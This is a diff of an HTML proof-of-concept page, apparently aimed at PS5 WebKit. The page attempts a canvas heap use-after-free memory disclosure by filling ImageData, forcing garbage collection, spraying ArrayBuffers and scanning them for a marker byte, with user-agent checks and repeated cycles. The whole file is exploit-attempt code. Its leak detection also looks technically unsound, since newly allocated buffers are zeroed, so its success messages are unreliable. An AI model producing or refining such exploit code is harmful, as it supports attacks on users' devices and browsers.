@@ -2,85 +2,126 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Canvas UAF Memory Disclosure PoC</title>
+  <title>Canvas Heap UAF PoC Optimized</title>
   <style>
-    body { font-family: sans-serif; }
-    #trigger { padding: 10px; font-size: 16px; cursor: pointer; }
-    #console { white-space: pre; background: #eee; padding: 10px; max-height: 300px; overflow-y: auto; }
+    body { font-family: sans-serif; padding: 20px; }
+    button { padding: 10px; font-size: 16px; }
+    #console { white-space: pre-wrap; font-family: monospace; border: 1px solid #ccc; padding: 10px; height: 300px; overflow-y: auto; margin-top: 10px; }
   </style>
 </head>
 <body>
-  <h1>Canvas UAF Memory Disclosure PoC</h1>
-  <button id="trigger">Run PoC</button>
-  <div id="console"></div>
 
-  <canvas id="canvas" width="512" height="512" style="display:none;"></canvas>
+<h1>Canvas Heap UAF PoC (Optimized)</h1>
+<p>Target: PS5 WebKit | Safe Memory Disclosure Test</p>
+<button onclick="runCycles(10)">Run Safe Cycles</button>
+<div><strong>Status:</strong> <span id="status">Idle...</span></div>
+<div><strong>Approx Memory Used:</strong> <span id="memUsage">0</span> MB</div>
+<div id="console"></div>
 
-  <script>
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    const consoleDiv = document.getElementById('console');
+<canvas id="canvas" width="512" height="512" style="display:none;"></canvas>
 
-    function log(msg) {
-      consoleDiv.textContent += msg + '\n';
-      consoleDiv.scrollTop = consoleDiv.scrollHeight;
-    }
+<script>
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+const status = document.getElementById('status');
+const consoleDiv = document.getElementById('console');
+const memUsage = document.getElementById('memUsage');
 
-    function stressGC() {
-      const tmp = [];
-      for (let i = 0; i < 10000; i++) {
-        tmp.push(new ArrayBuffer(1024 * 10));
+let approxMem = 0;
+
+function log(msg) {
+  consoleDiv.textContent += msg + '\n';
+  consoleDiv.scrollTop = consoleDiv.scrollHeight;
+}
+
+function updateStatus(msg) {
+  status.textContent = msg;
+}
+
+function updateMemoryDisplay() {
+  memUsage.textContent = (approxMem / (1024 * 1024)).toFixed(2);
+}
+
+function fillImageData(imgData, value) {
+  const view = new Uint8Array(imgData.data.buffer);
+  view.fill(value);
+}
+
+function stressGC() {
+  const junk = [];
+  for (let i = 0; i < 200; i++) {
+    junk.push(new ArrayBuffer(1024 * 512)); // 512 KB * 200 = ~100MB
+    approxMem += 1024 * 512;
+  }
+  updateMemoryDisplay();
+}
+
+async function attemptMemoryDisclosure() {
+  log('Starting UAF Memory Disclosure attempt...');
+
+  const imgData = ctx.createImageData(512, 512);
+  fillImageData(imgData, 0x41);
+
+  const weakRef = new WeakRef(imgData);
+  stressGC();
+
+  const leakers = [];
+  const leakerSize = 1024 * 32; // 32 KB
+  const leakerCount = isPS5() ? 300 : 500;
+
+  for (let i = 0; i < leakerCount; i++) {
+    const buf = new ArrayBuffer(leakerSize);
+    leakers.push(buf);
+    approxMem += leakerSize;
+  }
+
+  updateMemoryDisplay();
+
+  let leakDetected = false;
+
+  for (let i = 0; i < leakers.length; i++) {
+    const view = new Uint8Array(leakers[i]);
+    for (let j = 0; j < view.length; j++) {
+      if (view[j] === 0x41) {
+        log(`Leak in buffer ${i}, byte ${j}`);
+        leakDetected = true;
+        break;
       }
     }
+    if (leakDetected) break;
+  }
 
-    function fillImageData(imageData, value) {
-      const buf = new Uint8Array(imageData.data.buffer);
-      buf.fill(value);
-    }
+  if (!leakDetected) {
+    log('No leak detected in this attempt.');
+  } else {
+    log('*** Potential memory disclosure successful! ***');
+  }
+}
 
-    function attemptMemoryDisclosure() {
-      log('Starting UAF Memory Disclosure attempt...');
+async function runCycles(cycles = 10) {
+  approxMem = 0;
+  updateMemoryDisplay();
+  for (let c = 0; c < cycles; c++) {
+    updateStatus(`Cycle ${c + 1} of ${cycles}`);
+    log(`\n--- Cycle ${c + 1} ---`);
+    await new Promise(resolve => setTimeout(resolve, 100));
+    await attemptMemoryDisclosure();
+    await new Promise(resolve => setTimeout(resolve, 100));
+  }
+  updateStatus('Idle...');
+}
 
-      // Step 1: Create and fill ImageData
-      const imgData = ctx.createImageData(512, 512);
-      fillImageData(imgData, 0x41); // Fill with known value 'A'
+function isPS5() {
+  return navigator.userAgent.includes('PlayStation 5');
+}
 
-      // Step 2: Simulate freeing by dropping references and forcing GC
-      const weakRef = new WeakRef(imgData);
-      log('ImageData created, now dropping reference and forcing GC...');
-      stressGC();
+log(`User-Agent: ${navigator.userAgent}`);
+if (isPS5()) {
+  log('PS5 detected. Adjusting parameters...');
+} else {
+  log('Non-PS5 browser detected.');
+}
+</script>
 
-      // Step 3: Allocate multiple ArrayBuffers hoping to occupy freed memory
-      const leakers = [];
-      for (let i = 0; i < 5000; i++) {
-        leakers.push(new ArrayBuffer(imgData.data.buffer.byteLength));
-      }
-
-      // Step 4: Attempt to read residual data
-      let leakDetected = false;
-
-      for (let i = 0; i < leakers.length; i++) {
-        const view = new Uint8Array(leakers[i]);
-        for (let j = 0; j < 100; j++) {  // Only sample first 100 bytes
-          if (view[j] === 0x41) {
-            log(`Potential leak detected in buffer ${i}, byte ${j}: 0x${view[j].toString(16)}`);
-            leakDetected = true;
-            break;
-          }
-        }
-        if (leakDetected) break;
-      }
-
-      if (!leakDetected) {
-        log('No memory leak detected on this attempt.');
-      } else {
-        log('Memory disclosure potentially successful!');
-      }
-    }
-
-    document.getElementById('trigger').addEventListener('click', () => {
-      attemptMemoryDisclosure();
-    });
-  </script>
 </body>
 </html>
